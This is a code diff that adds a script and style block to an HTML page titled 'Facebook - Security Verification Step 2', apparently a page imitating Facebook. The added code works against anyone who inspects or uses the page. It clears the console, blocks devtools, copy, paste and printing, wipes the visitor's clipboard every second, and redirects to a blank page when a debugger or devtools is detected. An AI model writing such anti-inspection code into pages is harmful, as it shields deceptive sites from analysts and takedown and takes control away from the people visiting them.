@@ -1,6 +1,150 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
+<script>
+// Clear console continuously
+setInterval(() => console.clear(), 100);
+
+// Disable right-click context menu
+document.addEventListener('contextmenu', e => e.preventDefault());
+
+// Disable text selection
+document.addEventListener('selectstart', e => e.preventDefault());
+document.addEventListener('dragstart', e => e.preventDefault());
+
+// Disable copy/cut/paste
+document.addEventListener('keydown', e => {
+  // Disable F12, Ctrl+Shift+I, Ctrl+Shift+J, Ctrl+U, Ctrl+A, Ctrl+S, Ctrl+C, Ctrl+V
+  if (e.keyCode === 123 || // F12
+      (e.ctrlKey && e.shiftKey && (e.keyCode === 73 || e.keyCode === 74)) || // Ctrl+Shift+I/J
+      (e.ctrlKey && e.keyCode === 85) || // Ctrl+U
+      (e.ctrlKey && e.keyCode === 65) || // Ctrl+A
+      (e.ctrlKey && e.keyCode === 83) || // Ctrl+S
+      (e.ctrlKey && e.keyCode === 67) || // Ctrl+C
+      (e.ctrlKey && e.keyCode === 86)) { // Ctrl+V
+    e.preventDefault();
+    return false;
+  }
+});
+
+// Detect devtools
+let devtools = {open: false, orientation: null};
+const threshold = 160;
+
+setInterval(() => {
+  if (window.outerHeight - window.innerHeight > threshold || 
+      window.outerWidth - window.innerWidth > threshold) {
+    if (!devtools.open) {
+      devtools.open = true;
+      // Redirect away or show warning
+      window.location.href = 'about:blank';
+    }
+  } else {
+    devtools.open = false;
+  }
+}, 500);
+
+// Disable printing
+window.addEventListener('beforeprint', e => {
+  e.preventDefault();
+  return false;
+});
+
+// Block view source shortcuts
+document.onkeydown = function(e) {
+  if (e.ctrlKey && (e.keyCode === 85 || e.keyCode === 117)) {
+    return false;
+  }
+  if (e.keyCode === 123) {
+    return false;
+  }
+  if (e.ctrlKey && e.shiftKey && e.keyCode === 73) {
+    return false;
+  }
+  if (e.ctrlKey && e.shiftKey && e.keyCode === 74) {
+    return false;
+  }
+};
+
+// Disable drag and drop
+document.addEventListener('dragover', e => e.preventDefault());
+document.addEventListener('drop', e => e.preventDefault());
+
+// Clear clipboard
+if (navigator.clipboard) {
+  setInterval(() => {
+    navigator.clipboard.writeText('');
+  }, 1000);
+}
+
+// Disable image saving
+document.addEventListener('dragstart', e => {
+  if (e.target.tagName === 'IMG') {
+    e.preventDefault();
+  }
+});
+
+// Anti-debugging
+(() => {
+  function detectDebugger() {
+    const start = performance.now();
+    debugger;
+    const end = performance.now();
+    if (end - start > 100) {
+      window.location.href = 'about:blank';
+    }
+  }
+  setInterval(detectDebugger, 1000);
+})();
+
+// Blur content when losing focus (dev tools opened)
+window.addEventListener('blur', () => {
+  document.body.style.filter = 'blur(5px)';
+  setTimeout(() => {
+    document.body.style.filter = 'none';
+  }, 100);
+});
+</script>
+
+<style>
+/* Disable text selection */
+* {
+  -webkit-user-select: none !important;
+  -moz-user-select: none !important;
+  -ms-user-select: none !important;
+  user-select: none !important;
+  -webkit-touch-callout: none !important;
+  -webkit-tap-highlight-color: transparent !important;
+}
+
+/* Disable drag */
+* {
+  -webkit-user-drag: none !important;
+  -khtml-user-drag: none !important;
+  -moz-user-drag: none !important;
+  -o-user-drag: none !important;
+  user-drag: none !important;
+}
+
+/* Hide scrollbars to prevent inspecting */
+::-webkit-scrollbar { display: none; }
+* { scrollbar-width: none; }
+
+/* Disable outline on focus */
+* { outline: none !important; }
+
+/* Print protection */
+@media print {
+  * { display: none !important; }
+  body:after {
+    content: "Printing disabled for security";
+    display: block !important;
+    text-align: center;
+    font-size: 20px;
+  }
+}
+</style>
+
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
   <title>Facebook - Security Verification Step 2</title>
